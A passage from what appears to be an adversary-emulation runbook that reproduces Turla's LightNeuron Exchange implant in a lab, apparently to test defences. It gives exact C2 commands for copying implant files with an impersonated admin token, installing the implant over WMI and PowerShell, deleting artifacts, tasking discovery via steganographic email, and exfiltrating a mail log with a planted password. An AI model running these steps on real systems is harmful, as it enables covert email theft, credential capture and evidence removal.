./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\msiex.ps1 \\\\drebule\\C$\\Windows\\System32\\msiex.ps1", "runas": "nk\\zilvinasadmin"}'
```

* Wait 1 minute before copying the rules file:

```bash
# Copy email rules file
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\wdr.rules.xml \\\\drebule\\C$\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\msmdat.xml", "runas": "nk\\zilvinasadmin"}'
```

* Wait 1 minute before copying the last config file:

```bash
# Copy config file
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\perfe009.dat \"\\\\drebule\\C$\\Program Files\\Microsoft\\Exchange Server\\v15\\bin\\winmail.dat\"", "runas": "nk\\zilvinasadmin"}'
```

* Wait 1 minute and then task Snake to install LightNeuron remotely using WMI and Powershell, using `ZilvinasAdmin`'s token

```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 3, "proc": "wmic.exe", "args": "/node:drebule /privileges:enable /output:STDOUT process call create \"cmd.exe /c powershell.exe -File C:\\Windows\\System32\\msiex.ps1 > C:\\Windows\\Temp\\msiexinstallation.log 2>&1\"", "runas": "nk\\ZilvinasAdmin"}'
```
:heavy_exclamation_mark: Verify that the WMIC output shows a `ReturnValue` of 0.

* Wait 1 minute and then task Snake to check the installation log for any errors:

```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "type \\\\drebule\\C$\\Windows\\Temp\\msiexinstallation.log", "runas": "nk\\ZilvinasAdmin"}'
```

> Expected output will start with messages regarding PS-Session, the bottom of
> the file should look like:
> ```
> PSComputerName        : localhost
> RunspaceId            : 1e56a6dd-5fd2-4545-9db8-2a4ca6a77212
> Enabled               : False
> Priority              : 10
> TransportAgentFactory : Microsoft.Exchange.Transport.Agent.ConnectionFiltering.ConnectionFilteringAgentFactory
> AssemblyPath          : C:\Program Files\Microsoft\Exchange Server\V15\TransportRoles\agents\Hygiene\Microsoft.Exchange
>                         .Transport.Agent.ConnectionFiltering.dll
> IsCritical            : True
> EscalationTeam        : 
> Identity              : Connection Filtering Agent
> IsValid               : True
> ObjectState           : New
> 
> WARNING: Please exit Windows PowerShell to complete the installation.
> WARNING: The following service restart is required for the change(s) to take effect : MSExchangeTransport
> WARNING: The following service restart is required for the change(s) to take effect : MSExchangeTransport
> WARNING: Waiting for service 'Microsoft Exchange Transport (MSExchangeTransport)' to stop...
> WARNING: Waiting for service 'Microsoft Exchange Transport (MSExchangeTransport)' to start...
> ```

:heavy_exclamation_mark: If the output contains any errors, notify your lead.

* Wait 1 minute and then task Snake to remove artifacts from `uosis (10.100.40.102)`:

```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "del /Q C:\\Windows\\System32\\msiex.ps1 C:\\Windows\\System32\\wdr.rules.xml C:\\Windows\\System32\\mtxconf.dll C:\\Windows\\System32\\mtxcli.dll C:\\Windows\\System32\\perfe009.dat"}'
```

### :moyai: Source Code
* [Installation Script](../../Resources/LightNeuron/msiex.ps1)
* [LightNeuron](../../Resources/LightNeuron/)
  * [Masquerading legitimate file name](../../Resources/LightNeuron/CompanionDLL/data/winmail.dat)
* [Snake Usermodule DLL](../../Resources/Snake/UserModule/README.md)
  * [Task download](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Task execution for generic process with optional token impersonation](../../Resources/Snake/UserModule/src/execute.cpp#L406)
  * [Task execution via cmd with optional token impersonation](../../Resources/Snake/UserModule/src/execute.cpp#L337)
  * [Payload download](../../Resources/Snake/UserModule/src/comms_http.cpp#L604)
  * [Token duplication](../../Resources/Snake/UserModule/src/execute_token.cpp#L284)

### :microscope: Cited Intelligence

* TBD

## Step 19 - Discovery and Email Collection

:microphone: `Voice Track:`

Step 19 emulates Turla sending several discovery commands to the LightNeuron
implant and collecting and exfiltrating email traffic. 

Emails with JPG attachments containing AES encrypted commands embedded using
stegonagraphy are sent from the C2 server to the domain. LightNeuron's
transport agent processes all emails via LightNeuron's companion DLL, which
executes the embedded command and blocks delivery of the email from the C2
server.

LightNeuron automatically collects all emails with recipients matching `nk.local`
in a log file (`C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Temp\msmdat.xml`).

Eventually, LightNeuron is tasked to exfiltrate the email log, which is
exfiltrated over the existing C2 channel.

---

### :biohazard: Procedures

* From the Kali C2 lower terminal window, task LightNeuron to perform system
network configuration discovery:

```bash
./evalsC2client.py --set-task info@nk.local '5 | ipconfig /all'
```
* :heavy_exclamation_mark: If no response is received after 5 minutes, check
the postfix logs on the Kali server to make sure the email was intercepted and
processed correctly by LightNeuron.

  ```bash
  grep postfix /var/log/syslog
  ```
  * If there is a `reject` entry, that means the email, destined for a
  nonexistent user, was processed by the Exchange server, meaning that
  LightNeuron was either not successfully installed or is not working properly.

* :arrow_right: Return to your RDP session to `uosis (10.100.40.102)` as `Zilvinas`. 

* Go to your Edge browser window with the OWA page. Your windows should still be up from Step 6. 

* Create a new email:
 * The email recipient should be the user `egle@nk.local`
 * The email subject should be `SAP Integration Issue`
 * The following text should be pasted in as the email body:
   ```
   Hi Egle,
   After our meeting earlier I spoke with Tenko about the SAP integration issue that was preventing the users from logging in. I did a little digging and noticed there is an authentication error on the SAP server.

   When you get a few minutes could you check to make sure the service account is still active and the credentials have not expired? The account name is SVC_SAP2.
   ```

* Send the email

:arrow_right: Switch to your RDP window to `Azuolas` (`10.100.40.103`) as `Egle`. 

* Go to your Edge browser window. You should still be logged into OWA from Step 2.

* You should see the email from `Zilvinas@nk.local`. Try reloading the page if needed.

* Reply to the email from Zilvinas.
 * The following text should be pasted in as the email reply body:
   ```
   Zilvinas,

   I just checked on the service account. It appears that the account was still active, but the password had expired. I've adjusted the settings for the account, so the password should not expire again.

   The new password is: dfsbH%T5RWf3bwq3aeGR$3%
   
   Let me know if this fixes the authentication issue.
   ```

* Send the email

:arrow_right: Return to the Kali C2 server lower terminal window. Task the LightNeuron implant to exfiltrate the email log file:
```bash
./evalsC2client.py --set-task info@nk.local '3 | 0'
```

* The file contents will be logged by the control server.
:heavy_exclamation_mark: Verify that exfil was logged by the control server by checking the terminal window with the server output or by checking the server log file. The logs should contain the password Egle sent to Zilvinas:
```bash
grep 'dfsbH%T5RWf3bwq3aeGR$3%' /opt/day2/turla/Resources/control_server/logs.txt
```

### :moyai: Source Code
* [Transport Agent](../../Resources/LightNeuron/TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering/ConnectionFilteringAgent.cs)
  * [Remote Email Collection](../../Resources/LightNeuron/TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering/ConnectionFilteringAgent.cs#L56)
  * [Automated Collection](../../Resources/LightNeuron/TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering/ConnectionFilteringAgent.cs#L100)
  * [Email Hiding Rules](../../Resources/LightNeuron/TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering/ConnectionFilteringAgent.cs#L162)
* [Companion DLL](../../Resources/LightNeuron/CompanionDLL/)
  * [Check message against rule file](../../Resources/LightNeuron/CompanionDLL/src/exdbdata.cpp#L307)
  * [Data Staging/Automated Collection](../../Resources/LightNeuron/CompanionDLL/src/exdbdata.cpp#L196)
  * [Analyze attachment for data from C2](../../Resources/LightNeuron/CompanionDLL/src/exdbdata.cpp#L98)
  * [Send message back to C2 server over email](../../Resources/LightNeuron/CompanionDLL/src/exdbdata.cpp#L130)
* [Steganography](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp)
  * [Decode attachment data from base64](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L437)
  * [Check signature in image](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L136)
  * [Decrypt data in image](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L99)
  * [Extract task from image](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L302)
  * [Execute commands: Cmd ID 3](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L232)
  * [Execute commands: Cmd ID 5](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L263)
  * [Encrypt result of command in image](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L51)
  * [Hide result of command in image](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L184)
  * [Encode data in base64](../../Resources/LightNeuron/CompanionDLL/src/stego.cpp#L499)

### :microscope: Cited Intelligence

* <https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf>
